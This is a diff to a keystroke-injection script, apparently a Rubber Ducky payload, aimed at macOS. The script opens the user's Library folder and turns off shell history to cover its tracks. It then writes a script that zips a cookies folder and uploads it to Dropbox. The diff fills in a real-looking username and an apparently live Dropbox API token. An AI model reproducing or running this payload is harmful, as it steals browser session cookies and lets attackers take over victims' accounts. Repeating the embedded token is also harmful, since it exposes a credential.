@@ -31,7 +31,7 @@ ENTER
 DELAY 2000
 GUI-SHIFT g
 DELAY 1000
-STRING /Users/<SYSTEM USERNAME HERE>/Library
+STRING /Users/narstybits/Library
 DELAY 500
 ENTER
 DELAY 1000
@@ -55,7 +55,7 @@ STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && 
 DELAY 500
 ENTER
 DELAY 500
-STRING  echo 'cd ~/Desktop && zip -r cookies.zip cookies && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <YOUR API KEY HERE>" -H "Dropbox-API-Arg: {\"path\": \"/cookies.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @cookies.zip' > upload.sh
+STRING  echo 'cd ~/Desktop && zip -r cookies.zip cookies && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer sl.Bgy5RnRn6NtJ7AsRtCDdnU0ldbjBoVhQy_U4RTR25r6ZLPwXse1wfy7O7CSFv4GHLC25nC5QutPTpSnzR2XOn8qMaNx7Vy6OmCtBdE6ySfb9HL0ao2mBf_dpKv-NsWCJn_iEN6w-4l19" -H "Dropbox-API-Arg: {\"path\": \"/cookies.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @cookies.zip' > upload.sh
 DELAY 1000
 ENTER
 DELAY 2000
